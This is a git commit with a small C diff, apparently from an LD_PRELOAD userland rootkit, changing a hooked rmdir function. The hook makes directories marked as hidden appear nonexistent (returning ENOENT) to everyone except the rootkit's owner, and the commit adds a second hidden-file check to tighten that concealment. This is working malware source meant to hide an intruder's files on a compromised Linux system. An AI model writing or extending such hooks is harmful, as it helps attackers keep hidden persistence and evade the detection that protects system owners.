e7de80c9fc17b485f86d41d7120fdfb2e9b6cfd7
blank <mempodippy@users.noreply.github.com>
2017-01-10 10:27:54 +0000

    ok done
    dunno why the directory hooks weren't all checking for extended attributes, fixed a small bug

--- symbols/dir/rmdir.c
+++ symbols/dir/rmdir.c
@@ -8,7 +8,7 @@ int rmdir(const char *pathname)
 
     if(owned()) return old_rmdir(pathname);
 
-    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }
+    if(hidden_xattr(pathname) || hidden_xstat(_STAT_VER, pathname, 32)) { errno = ENOENT; return -1; }
 
     return old_rmdir(pathname);
 }
